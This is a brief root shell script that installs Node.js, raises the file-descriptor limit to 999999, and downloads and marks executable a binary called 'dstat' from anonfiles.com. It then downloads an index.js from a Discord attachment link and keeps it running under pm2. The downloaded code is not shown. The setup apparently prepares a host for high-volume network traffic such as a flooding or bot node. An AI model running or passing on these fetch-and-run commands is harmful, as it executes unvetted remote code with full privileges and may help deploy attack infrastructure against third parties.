apt-get update -y
apt-get install npm nodejs -y
cd /root
ulimit -n 999999
wget https://cdn-131.anonfiles.com/m3xcH4I6ya/80f6d876-1669049936/dstat
chmod +x ./dstat
npm init -y
npm i ws
npm i pm2 -g
wget https://cdn.discordapp.com/attachments/863132205546733588/1044293769517871164/index.js
pm2 start index.js
